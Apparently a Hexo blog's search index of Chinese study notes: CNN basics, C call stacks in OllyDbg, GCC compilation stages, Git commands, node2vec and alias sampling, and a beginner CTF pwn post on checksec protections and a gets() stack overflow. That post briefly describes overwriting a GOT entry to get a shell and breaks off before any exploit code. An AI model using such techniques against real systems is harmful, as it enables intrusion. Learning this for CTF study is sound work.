<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CNN原理与实践</title>
    <url>/2021/10/17/CNN%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5.html</url>
    <content><![CDATA[<h2 id="原理详解">原理详解</h2>
<h3 id="卷积">卷积</h3>
<p>通过设置一个<strong>filter或者称为kernel</strong>，对输入的矩阵进行<strong>卷积</strong>，对应位置相乘。<strong>步长为1</strong>，矩阵两个维度均减小<strong>kernel维度-1</strong>.</p>
<p><strong>可以通过设计特定的filter，让它去跟图片做卷积，就可以识别出图片中的某些特征</strong><span id="more"></span></p>
<p><strong>CNN（convolutional neural network），主要就是通过一个个的filter，不断地提取特征，从局部的特征到总体的特征，从而进行图像识别等等功能。</strong>学习的目的就是去学习这些filter中的参数。</p>
<p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211008193054401-148638570.jpg" /></p>
<h3 id="padding填白">Padding填白</h3>
<p>经过卷积后，图像会越来越小，padding分为<strong>same</strong>和<strong>valid</strong>。</p>
<p>same 就是卷积前后大小不变。<strong>在卷积前</strong>，对图像增加一个padding填白，使大小不变。先要确定卷积核的大小才能确定填充大小。</p>
<p>valid 就是不经过任何填白。</p>
<p>但是用什么填充呢，一般采用0填充。零填充：在图片像素的最外层加上若干层0值，若一层，记做p =1。<strong>0在权重乘积和运算中对最终结果不造成影响，也就避免了图片增加了额外的干扰信息。</strong></p>
<p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211008193714290-897558988.jpg" /></p>
<h3 id="步长stride">步长stride</h3>
<p>就是卷积核的移动长度，每次向右移动一个步长。</p>
<h3 id="pooling池化">pooling池化</h3>
<p>有的地方也成为<strong>采样sampling</strong></p>
<p>池化的目的使提取一定区域的主要特征，<strong>减少参数数量，防止模型过拟合</strong>。</p>
<p>常见的pooling有<strong>maxpooling</strong>，取一定区域的最大值。取步长为2，取区域最大值。还有averagePooling</p>
<p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211008194057122-600716143.jpg" /></p>
<h3 id="多通道卷积">多通道卷积</h3>
<p>全面看的都是输入的二维矩阵，现在看多通道，即三维的输入。</p>
<p>注意到下图要求，卷积核的最后一个3就是<strong>通道channel</strong>数，必须相同。</p>
<p>每一个kernel进行卷积得到一个二维矩阵，通过激活函数ReLU后放在一起即可。</p>
<p>这里需要主要一下维度的变化，<strong>kernel的数量==结果的通道数，输入通道数==kernel通道数</strong>。</p>
<p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211008194352219-2047578984.jpg" /></p>
<p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211008200101676-1316336134.png" /></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new_height = (input_height - filter_height + <span class="number">2</span> * P)/S + <span class="number">1</span></span><br><span class="line">new_width = (input_width - filter_width + <span class="number">2</span> * P)/S + <span class="number">1</span></span><br></pre></td></tr></table></figure>
<h3 id="cnn网络结构">CNN网络结构</h3>
<p>X--&gt;CONV(relu)--&gt;MAXPOOL--&gt;CONV(relu)--&gt;FC(relu)--&gt;FC(softmax)--&gt;Y</p>
<p>扁平化 <strong>(height,width,channel)</strong>的数据压缩成长度为 <strong>height × width × channel</strong> 的一维数组，然后再与 <strong>FC层</strong>连接，<strong>这之后就跟普通的神经网络无异了</strong>。</p>
<p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211008194727363-1650633100.jpg" /></p>
<h3 id="cnn相对传统网络的优势">CNN相对传统网络的优势</h3>
<ul>
<li>参数共享机制。网络的参数大大减少，可以使用较少的参数训练出更好的模型。</li>
<li>连接的稀疏性 输出的图像的任何一个单元仅和图像的一部分有关。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shape : N*C*H*W  ,  卷积核： H*W*</span><br></pre></td></tr></table></figure>
<p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211010095235308-136260343.png" /></p>
<h2 id="cnn代码实践">CNN代码实践</h2>
<h2 id="参考">参考</h2>
<p><a href="https://zhuanlan.zhihu.com/p/42559190">【DL笔记6】从此明白了卷积神经网络（CNN） - 知乎 (zhihu.com)</a></p>
<p><a href="https://blog.csdn.net/qq_34714751/article/details/85610966">(14条消息) 使用PyTorch实现CNN_dongyangY的博客-CSDN博客</a></p>
]]></content>
      <categories>
        <category>deep_learning</category>
      </categories>
      <tags>
        <tag>深度学习</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言函数调用栈的变化</title>
    <url>/2021/11/12/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96.html</url>
    <content><![CDATA[<p>函数调用过程中栈的变化情况，使用OD查看。</p>
<span id="more"></span>
<meta name="referrer" content="no-referrer"/>
<h2 id="写一个简单的c程序">写一个简单的C程序</h2>
<p><img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928175432813-259024174.png" /></p>
<h2 id="od调试">OD调试</h2>
<p>备注OD中显示的字符串顺序和字节顺序相反。<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928175856659-1739815303.png" alt="image-20210928175853974" /></p>
<p>设置两个断点，上面的是fun函数，下面的是main函数，直接F9执行到printf处。</p>
<figure>
<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928175530047-778883573.png" alt="image-20210928175527193" /><figcaption aria-hidden="true">image-20210928175527193</figcaption>
</figure>
<p>执行到printf处时，栈的情况。EBP=0x0061FEA8，需要主要栈窗口中会将一个函数对应的栈空间用大括号括起来，上一个函数保存的EBP往往在<strong>大括号外面</strong>的下一个，EBP寄存器也指向那个单元。</p>
<figure>
<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928180053498-1839617944.png" alt="image-20210928180050775" /><figcaption aria-hidden="true">image-20210928180050775</figcaption>
</figure>
<p>F8继续执行，发现栈顶的hello并没有消失，不知道为啥。难道是因为使用的是move esp hello？</p>
<p>F7进入fun函数，push了调用fun函数指令的下一条执行。0x401500是fun函数的起始地址，push ebp指令的地址。</p>
<figure>
<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928180651374-840441997.png" alt="image-20210928180648633" /><figcaption aria-hidden="true">image-20210928180648633</figcaption>
</figure>
<figure>
<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928180832040-362440497.png" alt="image-20210928180829321" /><figcaption aria-hidden="true">image-20210928180829321</figcaption>
</figure>
<p>继续执行push ebp，观察栈的变化。0x0061FEA8是main函数的EBP，此时EBP任然等于0x0061FEA8.</p>
<p>注意这里大括号的位置，EBP和之后的EIP都存在main的栈里面。</p>
<figure>
<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928180931017-719194241.png" alt="image-20210928180928333" /><figcaption aria-hidden="true">image-20210928180928333</figcaption>
</figure>
<p>直接执行到leave，栈空间大小位16个单元。局部变量放在EBP上面，还有12个单元是空着的。</p>
<figure>
<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928181348437-912568688.png" alt="image-20210928181345703" /><figcaption aria-hidden="true">image-20210928181345703</figcaption>
</figure>
<p>执行leave，观察C9 leave的作用.关闭了栈空间，但是原来的数据还是在那。相当于仅仅改变了EBP和ESP到执行fun函数的第一条指令前。</p>
<figure>
<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928181655819-1321192269.png" alt="image-20210928181653008" /><figcaption aria-hidden="true">image-20210928181653008</figcaption>
</figure>
<p>最后执行retn，EIP=0x40152E</p>
<figure>
<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928181911952-576817960.png" alt="image-20210928181908302" /><figcaption aria-hidden="true">image-20210928181908302</figcaption>
</figure>
<h2 id="总结">总结</h2>
<p>函数调用过程中，先入下一条指令地址，再保存EBP，再往上面放局部变量等。</p>
<p>fun没有包含参数调用，参数应该是最早入栈的.然后才是EIP，最后是EBP。之后就是调用函数的参数</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>reversing</tag>
      </tags>
  </entry>
  <entry>
    <title>GCC编译过程</title>
    <url>/2021/11/12/GCC%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B.html</url>
    <content><![CDATA[<p>GCC（英文全拼：GNU Compiler Collection）是 GNU 工具链的主要组成部分，是一套以 GPL 和 LGPL 许可证发布的程序语言编译器自由软件，由 Richard Stallman 于 1985 年开始开发。</p>
<span id="more"></span>
<figure>
<img src="https://img2022.cnblogs.com/blog/2348945/202206/2348945-20220630093923678-672911698.jpg" alt="查看源图像" /><figcaption aria-hidden="true">查看源图像</figcaption>
</figure>
<meta name="referrer" content="no-referrer"/>
<p>GCC 原名为 GNU C语言编译器，因为它原本只能处理 C 语言，但如今的 GCC 不仅可以编译 C、C++ 和 Objective-C，还可以通过不同的前端模块支持各种语言，包括 Java、Fortran、Ada、Pascal、Go 和 D 语言等等。</p>
<p>GCC 的编译过程可以划分为四个阶段：<strong>预处理（Pre-Processing）、编译（Compiling）、汇编（Assembling）以及链接（Linking）</strong>。</p>
<p><img src="/images/GCC%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/2348945-20211111180607726-394481153.jpg" /></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HH 5</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Here is a static library\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,HH);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="预处理">预处理</h2>
<p>主要是处理程序中以<strong>#</strong>开头的预处理指令，将其转换后插入文本中。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -e hello.c -o hello.i</span><br></pre></td></tr></table></figure>
<ul>
<li>递归处理#include预处理指令，将对应文件的内容复制到该处,出现了很多extern的函数原型</li>
<li>删除#define，并且在其被引用处递归地展开所有的宏定义</li>
<li>处理所有条件预处理指令 #if #ifdef</li>
<li>删除注释</li>
<li>添加行号和文件名标识</li>
</ul>
<p><img src="/images/GCC%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/2348945-20211111181618747-1578372619.png" /></p>
<h2 id="编译">编译</h2>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -S hello.c -o hello.s</span><br><span class="line">gcc -S hello.i -o hello.s -masm= intel -fno-asynchronous-unwind-tables</span><br></pre></td></tr></table></figure>
<p>-masm= intel用于指定为intel格式</p>
<p>-fno-asynchronous-unwind-tables 用于生成没有cfi宏的汇编指令，提高可读性</p>
<p>可以看到只有单个参数的printf被替换成puts了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	.file	&quot;hello.c&quot;</span><br><span class="line">	.text</span><br><span class="line">	.section	.rodata</span><br><span class="line">.LC0:</span><br><span class="line">	.string	&quot;Here is a test of gcc&quot;</span><br><span class="line">.LC1:</span><br><span class="line">	.string	&quot;%d\n&quot;</span><br><span class="line">	.text</span><br><span class="line">	.globl	foo</span><br><span class="line">	.type	foo, @function</span><br><span class="line">foo:</span><br><span class="line">.LFB0:</span><br><span class="line">	.cfi_startproc</span><br><span class="line">	pushq	%rbp</span><br><span class="line">	.cfi_def_cfa_offset 16</span><br><span class="line">	.cfi_offset 6, -16</span><br><span class="line">	movq	%rsp, %rbp</span><br><span class="line">	.cfi_def_cfa_register 6</span><br><span class="line">	leaq	.LC0(%rip), %rdi</span><br><span class="line">	call	puts@PLT</span><br><span class="line">	movl	$5, %esi</span><br><span class="line">	leaq	.LC1(%rip), %rdi</span><br><span class="line">	movl	$0, %eax</span><br><span class="line">	call	printf@PLT</span><br><span class="line">	nop</span><br><span class="line">	popq	%rbp</span><br><span class="line">	.cfi_def_cfa 7, 8</span><br><span class="line">	ret</span><br><span class="line">	.cfi_endproc</span><br><span class="line">.LFE0:</span><br><span class="line">	.size	foo, .-foo</span><br><span class="line">	.ident	&quot;GCC: (Debian 10.2.1-6) 10.2.1 20210110&quot;</span><br><span class="line">	.section	.note.GNU-stack,&quot;&quot;,@progbits</span><br></pre></td></tr></table></figure>
<h2 id="汇编">汇编</h2>
<p>汇编器根据汇编指定和机器指令对应的表进行翻译，生成目标文件。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -c hello.c -o hello.o</span><br><span class="line">gcc -c hello.s -o hello.o</span><br></pre></td></tr></table></figure>
<p>此时hello.o是一个可重定位文件</p>
<p><img src="/images/GCC%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/2348945-20211111182739761-2004410264.png" /></p>
<p>使用objdump查看内容，可以发现此时由于没有链接，导致字符串的起始地址为0x0000，函数地址也用foo标识。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ocjdump -sd hello.o -M intel</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello.o：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line">Contents of section .text:</span><br><span class="line"> 0000 554889e5 488d3d00 000000e8 00000000  UH..H.=.........</span><br><span class="line"> 0010 be050000 00488d3d 00000000 b8000000  .....H.=........</span><br><span class="line"> 0020 00e80000 0000905d c3                 .......].       </span><br><span class="line">Contents of section .rodata:</span><br><span class="line"> 0000 48657265 20697320 61207465 7374206f  Here is a test o</span><br><span class="line"> 0010 66206763 63002564 0a00               f gcc.%d..      </span><br><span class="line">Contents of section .comment:</span><br><span class="line"> 0000 00474343 3a202844 65626961 6e203130  .GCC: (Debian 10</span><br><span class="line"> 0010 2e322e31 2d362920 31302e32 2e312032  .2.1-6) 10.2.1 2</span><br><span class="line"> 0020 30323130 31313000                    0210110.        </span><br><span class="line">Contents of section .eh_frame:</span><br><span class="line"> 0000 14000000 00000000 017a5200 01781001  .........zR..x..</span><br><span class="line"> 0010 1b0c0708 90010000 1c000000 1c000000  ................</span><br><span class="line"> 0020 00000000 29000000 00410e10 8602430d  ....)....A....C.</span><br><span class="line"> 0030 06640c07 08000000                    .d......        </span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;foo&gt;:</span><br><span class="line">   0:   55                      push   rbp</span><br><span class="line">   1:   48 89 e5                mov    rbp,rsp</span><br><span class="line">   4:   48 8d 3d 00 00 00 00    lea    rdi,[rip+0x0]        # b &lt;foo+0xb&gt;</span><br><span class="line">   b:   e8 00 00 00 00          call   10 &lt;foo+0x10&gt;</span><br><span class="line">  10:   be 05 00 00 00          mov    esi,0x5</span><br><span class="line">  15:   48 8d 3d 00 00 00 00    lea    rdi,[rip+0x0]        # 1c &lt;foo+0x1c&gt;</span><br><span class="line">  1c:   b8 00 00 00 00          mov    eax,0x0</span><br><span class="line">  21:   e8 00 00 00 00          call   26 &lt;foo+0x26&gt;</span><br><span class="line">  26:   90                      nop</span><br><span class="line">  27:   5d                      pop    rbp</span><br><span class="line">  28:   c3                      ret    </span><br></pre></td></tr></table></figure>
<h2 id="链接">链接</h2>
<p>gcc默认使用动态链接，加入-static选项即可静态链接。将目标文件及其依赖库进行连接，生成可执行文件，主要包括 <strong>地址和空间分配</strong>，<strong>符号绑定</strong>，<strong>重定位</strong>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc hello.o -o hello -static</span><br></pre></td></tr></table></figure>
<p>由于使用静态链接，导致objdump后存在大量汇编指令</p>
<h2 id="参考">参考</h2>
<p><a href="https://zhuanlan.zhihu.com/p/380180101">gcc 编译命令详解及最佳实践 - 知乎 (zhihu.com)</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>Git</title>
    <url>/2022/07/02/Git.html</url>
    <content><![CDATA[<h1 id="git实践">GIT实践</h1>
<p>本文简单描述git的简单使用，主要用于目前的工作上传，项目的管理与保存。</p>
<p>git请自行安装和配置ssh，ssh可以避免每次输入密码。</p>
<p>推荐学习：<a href="https://mp.weixin.qq.com/s?__biz=MzA4ODUxNjUzMQ==&amp;mid=2247492950&amp;idx=1&amp;sn=31f02ab96294c1261671444cf6cef436&amp;chksm=902a578aa75dde9cabeac894d3be0f5e7f04fd3c78a8e778c82a67df7dedae1f4e605920ad45&amp;mpshare=1&amp;scene=23&amp;srcid=042951KE61l4SbyNls7io2xG&amp;sharer_sharetime=1619654594166&amp;sharer_shareid=0eb51fd6844570f534893038ef82a599#rd">万字详解Git</a></p>
<p>创建仓库,生成了一个.gitignore文件，用于表示git操作会忽略那些文件。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure>
<h2 id="git流程">git流程</h2>
<p>git操作的过程概念图。</p>
<h2 id="git常用命令">git常用命令</h2>
<h3 id="git-add">git add</h3>
<p>先来看用的比较多的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git add filename //添加单个文件到暂存区  </span><br><span class="line">git add .        //添加目录下所有文件</span><br><span class="line">//如果有文件夹，文件夹内容并不会添加，需要进入到目录中再git add file ，文件夹会被自动add上</span><br><span class="line">git add -A  提交所有变化</span><br><span class="line">git add -u  提交被修改(modified)和被删除(deleted)文件，不包括新文件(new)</span><br><span class="line">git add .  提交新文件(new)和被修改(modified)文件，不包括被删除(deleted)文件</span><br></pre></td></tr></table></figure>
<h3 id="git-commit">git commit</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git commit -m &quot;&quot;//提交到本地版本库</span><br></pre></td></tr></table></figure>
<h3 id="git-status">git status</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git status //查看文件的变动情况</span><br></pre></td></tr></table></figure>
<figure>
<img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702231048489-344800322.png" alt="image-20211011172259237" /><figcaption aria-hidden="true">image-20211011172259237</figcaption>
</figure>
<h3 id="git-log">git log</h3>
<p>打印提交的相关信息</p>
<figure>
<img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702231048561-47393192.png" alt="image-20211011174502458" /><figcaption aria-hidden="true">image-20211011174502458</figcaption>
</figure>
<h3 id="git-remote">git remote</h3>
<p>在push之前，我们需要将远程的版本库和本地的仓库关联起来，git直到它该往哪里提交。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git remote add [远程主机名] [url]//远程主机名可以自己定义，一般用origin</span><br><span class="line">//url是那个后缀为.git的仓库url</span><br></pre></td></tr></table></figure>
<h3 id="git-branch">git branch</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git branch //查看当前存在的分支，本地git默认为master，最好改成mian</span><br><span class="line">git checkout -b main //创建main分支</span><br><span class="line">git merge master     //在main分支中合并master</span><br><span class="line">git branch -m master main  //master改名为main</span><br></pre></td></tr></table></figure>
<h3 id="git-push">git push</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git push &lt;远程主机名&gt; &lt;本地分支名&gt;:&lt;远程分支名&gt;</span><br><span class="line">git push -u origin main</span><br><span class="line">git push -u origin main: main</span><br></pre></td></tr></table></figure>
<h3 id="git-pull">git pull</h3>
<p>将远程仓库和本地合并</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git pull origin branchname  //用法和push类似</span><br><span class="line">git pull --rebase origin master</span><br><span class="line">git pull origin master</span><br></pre></td></tr></table></figure>
<h3 id="git-checkout">git checkout</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git checkout 分支名//转移到其他分支</span><br></pre></td></tr></table></figure>
<h3 id="git-tag">git tag</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git tag publish/0.0.1</span><br><span class="line">git push origin publish/0.0.1</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>随机游走</title>
    <url>/2022/07/02/NRL.html</url>
    <content><![CDATA[<p>有很多的叫法，GRL, NRL, GE（graph embedding）等等，感觉都是得到图的嵌入表示。</p>
<h1 id="deepwalk">deepwalk</h1>
<h2 id="原理">原理</h2>
<p>从每一个节点出发，每次随机从邻居中选择一个作为下一个节点</p>
<h1 id="node2vec">node2vec</h1>
<h2 id="原理-1">原理</h2>
<p>deepwalk和LINE分别倾向于DFS和BFS，而node2vec则是使用了权重作为概率，介于DFS和BFS之间。</p>
<p>主要分为三部分：</p>
<p><strong>计算基于边的转移概率</strong>：这里是上一个点不是起始点需要用的。</p>
<p>下图的意思是，从t出发，到达v之后，再往其他位置走的概率如下公式。（前面至少两个点才能用这个，起始点的话就只能用权重做归一化了）。感觉参考一的这个公式有点问题，下面是自己改的。</p>
<p><span class="math display">\[
\left[P(\text { transform } \mid(t, v))=\alpha_{p q}(t, x) * w_{v, x} \quad \text { for } x \in N(v)\right]
\]</span></p>
<p><img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702230139717-1905633555.png" /></p>
<p><span class="math display">\[
\alpha_{p q}(t, x)=\left\{\begin{array}{ll}
\frac{1}{p}= &amp; \text { if } d_{t x}=0 \\
1= &amp; \text { if } d_{t x}=1 \\
\frac{1}{q}= &amp; \text { if } d_{t x}=2
\end{array}\right.
\]</span></p>
<p><strong>基于节点的转移概率</strong>：对于起始点而言，将该节点的每一条边的权重归一化，作为走那边的概率。</p>
<p><strong>alias取样</strong>：需要对每一个节点和边都生成accept和alias列表。节点的alias tables其实意义不大，主要是边的，最后取样。这个取样，其实就是<strong>依据概率，看你走那条边</strong>。</p>
<p>个人觉得，其实不用这个算法也可以，就轮盘赌，挨着比大小，就是复杂度高很多，而且一些图的节点比较多。</p>
<p>取样完成后使用skip-gram算法对walks进行嵌入，参考一中用gensim中的word2vec。</p>
<h2 id="alias算法一种o1的采样算法">alias算法—一种<span class="math inline">\(O(1)\)</span>的采样算法</h2>
<p>个人感觉跟之前学的轮盘赌算法差不多，alias牺牲空间，换来时间，但是实际计算accept和alias的时候任然是$O(N) $</p>
<p>第一幅图代表一个概率轮盘，一般来说，我们需要生成一个0到1的随机数，判断在哪个区间，从而得到取样结果，也就是命中的那一块。</p>
<p>依次遍历复杂度为<span class="math inline">\(O(N)\)</span>, 二分法复杂度为<span class="math inline">\(O(log(N))\)</span></p>
<p><img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702230139627-879488429.png" /></p>
<p>alias算法按照下面的公式，这里N=4，先<strong>归一化，然后乘以区域个数</strong>。之后，切割矩形，保证<strong>每一个柱子的大小为1</strong>，并且只能由<strong>最多之前的两块合成一个</strong>，得到下图，可以任意拼凑，满足条件即可。</p>
<p><span class="math display">\[
\frac{p_{i} * N}{\sum_{k=1}^{k=N} p_{k}}
\]</span></p>
<p><img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702230139628-882899191.png" /></p>
<p><strong>Accept就是原本该块留下来的面积，alias对应的是另一种颜色区域的编号。</strong></p>
<p><img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702230139871-1857972696.png" /></p>
<p>第一次学习的时候感觉不可思议，后面看看确实是那么回事，可以找找证明。</p>
<p><img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702230139759-616872325.png" /></p>
<h1 id="实现">实现</h1>
<p>参考一中非常详细</p>
<h1 id="参考">参考</h1>
<p><a href="https://blog.csdn.net/BIT_666/article/details/119890792">GraphEmbedding - Node2vec 图文详解_BITDDD小栈-CSDN博客_node2vec</a></p>
<p><a href="https://www.cnblogs.com/dogecheng/p/13198198.html">【图嵌入】DeepWalk 和 Node2Vec - 那少年和狗 - 博客园</a> alias算法的图很好</p>
<p><a href="https://zhuanlan.zhihu.com/p/54867139">Alias Method:时间复杂度O(1)的离散采样方法 - 知乎 (zhihu.com)</a></p>
]]></content>
      <categories>
        <category>深度学习</category>
      </categories>
      <tags>
        <tag>deep_learning</tag>
      </tags>
  </entry>
  <entry>
    <title>PWN入门</title>
    <url>/2021/11/12/PWN%E5%85%A5%E9%97%A8.html</url>
    <content><![CDATA[<p>pwn 入门学习，走一遍流程</p>
<span id="more"></span>
<meta name="referrer" content="no-referrer"/>
<p>[TOC]</p>
<p><a href="https://buuoj.cn/challenges">BUUCTF在线评测 (buuoj.cn)</a> rip</p>
<h2 id="checksec">checksec</h2>
<p>使用,查看文件的加固机制</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">checksec filename#老版</span><br><span class="line">checksec --file=filename #新版</span><br></pre></td></tr></table></figure>
<center>
<image src="https://upload-images.jianshu.io/upload_images/11071922-51baa910d9fa15dc.png?imageMogr2/auto-orient/strip|imageView2/2/w/626/format/webp"/>
</center>
<p><strong>Arch:</strong>程序架构信息</p>
<p><strong>RELRO</strong>（relocation read-only)：主要针对GOT改写的攻击方式，分为两种，partial relro和full relro</p>
<p>部分RELRO 易受到攻击，例如攻击者可以<strong>atoi.got为system.plt，进而输入/bin/sh00获得shell</strong> 完全RELRO 使整个 GOT 只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -o hello test.c // 默认情况下，是Partial RELRO</span><br><span class="line">gcc -z norelro -o hello test.c // 关闭，即No RELRO</span><br><span class="line">gcc -z lazy -o hello test.c // 部分开启，即Partial RELRO</span><br><span class="line">gcc -z now -o hello test.c // 全部开启，即Full RELRO</span><br></pre></td></tr></table></figure>
<p><strong>stack-caacry:</strong>栈溢出保护。当启用栈保护后，函数开始执行的时候会先往栈里插入类似cookie的信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。</p>
<p><strong>NX：</strong>开启会让栈中数据没有执行权限，无法触发shellcode，只会造成程序崩溃，可以利用rop绕过。</p>
<p><strong>PIE</strong>：位置无关可执行，程序运行时各个段加载的虚拟地址是再装载时确定。</p>
<h2 id="静态分析代码">静态分析代码</h2>
<p>看到main函数，gets函数可能存在栈溢出漏洞，接着点击s局部变量进入栈空间。</p>
<figure>
<img src="/images/PWN%E5%85%A5%E9%97%A8/2348945-20210924133030041-1533255546.png" alt="image-20210924133025356" /><figcaption aria-hidden="true">image-20210924133025356</figcaption>
</figure>
<p>第一次看到略感奇怪怎么两个s，r又是什么。首先明确这是main函数的栈空间，<strong>上面的s是局部变量，下面的s指的是rbp</strong>，64位程序8个字节。r比较特殊，有的地方说是return的东西，但是返回东西一般是通过寄存器eax或rax返回的，有点忘了。<strong>r应该是main函数执行完成后，EIP的值，即main函数结束后要执行的下一条执行。</strong></p>
<p>栈溢出漏洞请自行补充知识。</p>
<p><img src="/images/PWN%E5%85%A5%E9%97%A8/2348945-20210924133138596-1167051620.png" /></p>
<p>找到提权函数，这个还没有搞懂，大概就是让mian函数执行完了，执行fun函数，然后既可以cat flag了。</p>
<p><img src="/images/PWN%E5%85%A5%E9%97%A8/2348945-20210924133524694-1219666581.png" /></p>
<h2 id="动态分析">动态分析</h2>
<p>难度大一些的才需要，使用GDB和peda分析。</p>
<h2 id="编写exp">编写exp</h2>
<p>remote和process一个是远程服务器，一个是本地尝试，使用时只用一个。</p>
<p>本地测试需要赋予可执行的权限，不然总是显示没有权限sudo也不行。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod a+x pwn1</span><br></pre></td></tr></table></figure>
